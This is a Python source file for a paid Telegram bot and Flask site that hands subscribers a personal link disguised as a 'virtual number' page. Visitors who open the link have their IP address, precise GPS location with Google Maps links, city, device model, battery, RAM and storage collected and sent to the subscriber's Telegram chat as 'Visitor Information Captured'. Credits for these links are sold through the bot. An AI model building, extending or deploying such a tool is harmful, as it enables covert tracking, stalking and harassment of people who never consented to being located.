from flask import Flask, render_template, request, jsonify
import requests
import os
import threading
import asyncio
import logging
from datetime import datetime, timezone
from dotenv import load_dotenv
from pymongo import MongoClient
from pyrogram import Client, filters
from pyrogram.enums import ButtonStyle, ChatMemberStatus
from pyrogram.errors import RPCError
from pyrogram.handlers import CallbackQueryHandler, ChatJoinRequestHandler, MessageHandler
from pyrogram.types import ChatJoinRequest, CallbackQuery, InlineKeyboardButton, InlineKeyboardMarkup, Message

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
LOGGER = logging.getLogger(__name__)


def required(name):
    value = os.getenv(name)
    if not value:
        raise RuntimeError(f"Missing {name}. Add it to your .env file.")
    return value


mongo_client = MongoClient(os.getenv("MONGODB_URI", "mongodb://localhost:27017/"))
users_collection = mongo_client[
    os.getenv("MONGODB_DB", "privacy_demo")
][os.getenv("USER_COLLECTION", "users")]
pending_requests_collection = mongo_client[
    os.getenv("MONGODB_DB", "privacy_demo")
][os.getenv("PENDING_JOIN_REQUEST_COLLECTION", "pending_join_requests")]
PENDING_JOIN_REQUESTS = {}


def save_user_data(user):
    """Create/update user data and grant two credits only on first insert."""
    now = datetime.now(timezone.utc)
    result = users_collection.update_one(
        {"telegram_id": user.id},
        {
            "$set": {
                "telegram_id": user.id,
                "username": user.username,
                "first_name": user.first_name,
                "last_name": user.last_name,
                "updated_at": now,
            },
            "$setOnInsert": {
                "created_at": now,
                "first_seen_at": now,
                "credits": 2,
            },
        },
        upsert=True,
    )
    return result.upserted_id is not None


def get_user_credits(user_id):
    """Return the user's current credit balance, defaulting to zero."""
    user = users_collection.find_one({"telegram_id": user_id}, {"credits": 1})
    return int((user or {}).get("credits", 0))


def save_pending_join_request(chat_id, user_id):
    """Persist a join request so it survives bot restarts."""
    pending_requests_collection.update_one(
        {"channel_id": chat_id, "telegram_id": user_id},
        {"$set": {"requested_at": datetime.now(timezone.utc)}},
        upsert=True,
    )


def has_saved_pending_join_request(chat_id, user_id):
    return pending_requests_collection.find_one(
        {"channel_id": chat_id, "telegram_id": user_id},
        {"_id": 1},
    ) is not None


def clear_pending_join_request(chat_id, user_id):
    pending_requests_collection.delete_one({"channel_id": chat_id, "telegram_id": user_id})


def chat_id_from_env(name):
    """Use numeric IDs for private channels and @usernames for public channels."""
    value = required(name)
    return int(value) if value.lstrip("-").isdigit() else value


# Keep the order below the same as the CHANNEL_X_URL values in .env.
REQUIRED_CHANNELS = tuple(
    (
        chat_id_from_env(f"CHANNEL_{number}_ID"),
        required(f"CHANNEL_{number}_URL"),
        f"Channel {number}",
    )
    for number in range(1, 5)
)

# This is created inside the Telegram thread so Pyrogram never crosses event loops.
telegram_bot = None

WELCOME_TEXT = (
    "<b>Welcome!</b>\n\n"
    "You are now subscribed to all required channels and can use this bot."
)


def welcome_text(first_time):
    if first_time:
        return f"{WELCOME_TEXT}\n\n🎁 <b>You received 2 free credits!</b>"
    return WELCOME_TEXT

JOIN_TEXT = (
    "<b>Subscription required</b>\n"
    "━━━━━━━━━━━━━━━━━━━━\n\n"
    "<b>Join all four channels to use this bot.</b>"
)

CREDITS_EMPTY_TEXT = (
    "<b>💳 No credits remaining</b>\n"
    "━━━━━━━━━━━━━━━━━━━━\n\n"
    "Please contact the admin to buy credits.\n\n"
    "<b>✨ Credit plans</b>\n"
    "• <b>20 credits</b> — ₹30\n"
    "• <b>50 credits</b> — ₹70\n"
    "• <b>110 credits</b> — ₹100\n\n"
    "<b>📩 Contact admin:</b> @its_aadish"
)


def get_client_ip():
    forwarded_for = request.headers.get("X-Forwarded-For")
    if forwarded_for:
        return forwarded_for.split(",")[0].strip()

    real_ip = request.headers.get("X-Real-IP")
    if real_ip:
        return real_ip.strip()

    cf_ip = request.headers.get("CF-Connecting-IP")
    if cf_ip:
        return cf_ip.strip()

    return request.remote_addr or "unknown"


def send_telegram_message(chat_id, text):
    if not BOT_TOKEN:
        raise RuntimeError("TELEGRAM_BOT_TOKEN is not set")

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text
    }
    response = requests.post(url, json=payload, timeout=15)
    data = response.json()

    if not response.ok or not data.get("ok"):
        raise RuntimeError(data.get("description", "Telegram send failed"))

    return data


def google_maps_link(latitude, longitude):
    """Return a safe Google Maps coordinate URL or None for invalid values."""
    try:
        latitude = float(latitude)
        longitude = float(longitude)
    except (TypeError, ValueError):
        return None
    if not (-90 <= latitude <= 90 and -180 <= longitude <= 180):
        return None
    return f"https://www.google.com/maps?q={latitude:.6f},{longitude:.6f}"


def join_keyboard(missing_channels):
    """Match the coloured button layout used by your other Kurigram bot."""
    return InlineKeyboardMarkup(
        [
            [InlineKeyboardButton(name, url=url, style=ButtonStyle.PRIMARY)]
            for _, url, name in missing_channels
        ]
        + [[
            InlineKeyboardButton(
                "✅ Joined",
                callback_data="verify_subscription",
                style=ButtonStyle.SUCCESS,
            )
        ]]
    )


async def missing_required_channels(user_id):
    if telegram_bot is None:
        raise RuntimeError("Telegram bot is not running")
    inactive_statuses = {ChatMemberStatus.LEFT, ChatMemberStatus.BANNED}
    missing = []
    for channel in REQUIRED_CHANNELS:
        chat_id, _, _ = channel
        try:
            member = await telegram_bot.get_chat_member(chat_id, user_id)
            if member.status in inactive_statuses:
                if not await has_pending_join_request(chat_id, user_id):
                    missing.append(channel)
            else:
                PENDING_JOIN_REQUESTS.get(chat_id, set()).discard(user_id)
                await asyncio.to_thread(clear_pending_join_request, chat_id, user_id)
        except RPCError:
            if not await has_pending_join_request(chat_id, user_id):
                missing.append(channel)
    return tuple(missing)


async def has_pending_join_request(chat_id, user_id):
    """Check both recent memory and MongoDB, including after a restart."""
    return (
        user_id in PENDING_JOIN_REQUESTS.get(chat_id, set())
        or await asyncio.to_thread(has_saved_pending_join_request, chat_id, user_id)
    )


async def process_join_request(_, join_request: ChatJoinRequest):
    """Save requests created through approval-required channel invite links."""
    invite_link = join_request.invite_link
    if not invite_link or not invite_link.creates_join_request:
        return

    for chat_id, _, _ in REQUIRED_CHANNELS:
        if join_request.chat.id == chat_id:
            user_id = join_request.from_user.id
            PENDING_JOIN_REQUESTS.setdefault(chat_id, set()).add(user_id)
            try:
                await asyncio.to_thread(save_pending_join_request, chat_id, user_id)
            except Exception:
                LOGGER.exception("Could not save join request for user %s", user_id)
            return


async def start_command(_, message: Message):
    if not message.from_user:
        return
    missing_channels = await missing_required_channels(message.from_user.id)
    if missing_channels:
        await message.reply_text(JOIN_TEXT, reply_markup=join_keyboard(missing_channels))
        return
    try:
        first_time = await asyncio.to_thread(save_user_data, message.from_user)
    except Exception:
        LOGGER.exception("Could not save verified Telegram user %s", message.from_user.id)
        first_time = False
    await message.reply_text(welcome_text(first_time))


async def verify_subscription(_, callback_query: CallbackQuery):
    missing_channels = await missing_required_channels(callback_query.from_user.id)
    if missing_channels:
        await callback_query.answer("Please join all four channels first.", show_alert=True)
        return
    try:
        first_time = await asyncio.to_thread(save_user_data, callback_query.from_user)
    except Exception:
        LOGGER.exception("Could not save verified Telegram user %s", callback_query.from_user.id)
        first_time = False
    await callback_query.answer("Membership verified!")
    await callback_query.message.delete()
    await callback_query.message.reply_text(welcome_text(first_time))


async def link_command(_, message: Message):
    """Send the subscriber's personal visitor-information page URL."""
    if not message.from_user:
        return
    missing_channels = await missing_required_channels(message.from_user.id)
    if missing_channels:
        await message.reply_text(JOIN_TEXT, reply_markup=join_keyboard(missing_channels))
        return

    try:
        credits = await asyncio.to_thread(get_user_credits, message.from_user.id)
    except Exception:
        LOGGER.exception("Could not read credits for Telegram user %s", message.from_user.id)
        await message.reply_text("Unable to check your credits right now. Please try again later.")
        return

    if credits <= 0:
        await message.reply_text(CREDITS_EMPTY_TEXT)
        return

    website_url = os.getenv("WEBSITE_URL", "").rstrip("/")
    if not website_url:
        await message.reply_text("Website link is not configured. Ask the bot owner to set WEBSITE_URL.")
        return

    referral_url = f"{website_url}/virtual_number?referral={message.from_user.id}"
    await message.reply_text(
        f"<b>💳 Total credits: {credits}</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"<b>Here is your website link:</b>\n\n<code>{referral_url}</code>"
    )


def run_telegram_bot():
    """Run Pyrogram in a dedicated thread and event loop."""
    global telegram_bot
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    telegram_bot = Client(
        "location_finder_bot",
        api_id=int(required("API_ID")),
        api_hash=required("API_HASH"),
        bot_token=required("TELEGRAM_BOT_TOKEN"),
    )
    telegram_bot.add_handler(
        MessageHandler(start_command, filters.command("start") & filters.private)
    )
    telegram_bot.add_handler(
        MessageHandler(link_command, filters.command("link") & filters.private)
    )
    telegram_bot.add_handler(
        CallbackQueryHandler(verify_subscription, filters.regex("^verify_subscription$"))
    )
    telegram_bot.add_handler(ChatJoinRequestHandler(process_join_request))
    # Client.run() calls Pyrogram's idle(), which registers OS signal handlers.
    # Signal handlers are only allowed in the main thread, so keep this loop alive
    # directly after starting the client instead.
    try:
        telegram_bot.start()
        loop.run_forever()
    finally:
        if telegram_bot.is_connected:
            telegram_bot.stop()
        loop.close()


@app.route("/")
def home():
    return render_template("home.html")


@app.route("/privacy")
def privacy():
    return render_template("privacy.html")


@app.route("/virtual_number", methods=["GET", "POST"])
def handle():
    chat_id = request.args.get("referral")

    if chat_id is None or not str(chat_id).isdigit():
        return "Invalid Chat ID", 400

    # GET → Render page
    if request.method == "GET":
        return render_template("index.html", referral=chat_id)

    # POST → Send to Telegram
    data = request.get_json()

    if not data:
        return jsonify({"error": "No data received"}), 400

    precise_map_link = google_maps_link(
        data.get("precise_latitude"), data.get("precise_longitude")
    )
    approximate_map_link = google_maps_link(
        data.get("ip_latitude"), data.get("ip_longitude")
    )
    if precise_map_link:
        location_map_line = f"\n   • Location: {precise_map_link}"
    elif approximate_map_link:
        location_map_line = f"\n   • Approx. Location: {approximate_map_link}"
    else:
        location_map_line = "\n   • Approx. Location: Unavailable"
    data["timezone"] = f"{data.get('timezone')}{location_map_line}"

    message = f"""
📊 Visitor Information Captured
━━━━━━━━━━━━━━━━

🖥  Device & Browser
    • Device Model: {data.get('device_model')}
    • User Agent: {data.get('user_agent')}

🌐 Network Information
   • IP Address: {data.get('ip_address')}
   • Language: {data.get('language')}

📍 Location Details
   • Country: {data.get('country')}
   • Region: {data.get('region')}
   • City: {data.get('city')}
   • Timezone: {data.get('timezone')}

🖼 Display Information
   • Resolution: {data.get('screen_resolution')}   

🔋 Battery Status
   • Level: {data.get('battery_level')}
   • Charging: {data.get('battery_charging')}   

💾 Hardware & Storage
   • CPU Cores: {data.get('cpu_cores')}
   • RAM: {data.get('ram_gb')} GB
   • Storage Used: {data.get('storage_used_gb')}
   • Storage Total: {data.get('storage_total_gb')}

━━━━━━━━━━━━━━━━
"""

    try:
        send_telegram_message(chat_id, message)
        return jsonify({"status": "sent"})
    except Exception as e:
        return jsonify({"status": "failed", "error": str(e)}), 502


@app.route("/get-ip")
def get_ip():
    client_ip = get_client_ip()
    local_loopbacks = {"127.0.0.1", "::1", "unknown", "localhost"}

    if client_ip in local_loopbacks:
        return jsonify({
            "ip_address": client_ip,
            "country": "Local",
            "region": "Localhost",
            "city": "Local environment",
            "timezone": "Local time",
            "latitude": None,
            "longitude": None,
        })

    try:
        lookup_url = f"https://ipwho.is/{client_ip}"
        response = requests.get(lookup_url, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
        data = response.json()

        if not data.get("success", True):
            return jsonify({
                "ip_address": client_ip,
                "country": "Unavailable",
                "region": "Unavailable",
                "city": "Unavailable",
                "timezone": "Unavailable",
                "latitude": None,
                "longitude": None,
            })

        return jsonify({
            "ip_address": data.get("ip") or client_ip,
            "country": data.get("country") or "Unavailable",
            "region": data.get("region") or "Unavailable",
            "city": data.get("city") or "Unavailable",
            "timezone": (data.get("timezone") or {}).get("id") or "Unavailable",
            "latitude": data.get("latitude"),
            "longitude": data.get("longitude"),
        })

    except Exception as e:
        return jsonify({
            "ip_address": client_ip,
            "country": "Unavailable",
            "region": "Unavailable",
            "city": "Unavailable",
            "timezone": "Unavailable",
            "latitude": None,
            "longitude": None,
            "error": str(e),
        })


if __name__ == "__main__":
    port = int(os.getenv("PORT", "5000"))
    threading.Thread(target=run_telegram_bot, daemon=True).start()
    app.run(host="0.0.0.0", port=port, debug=False)
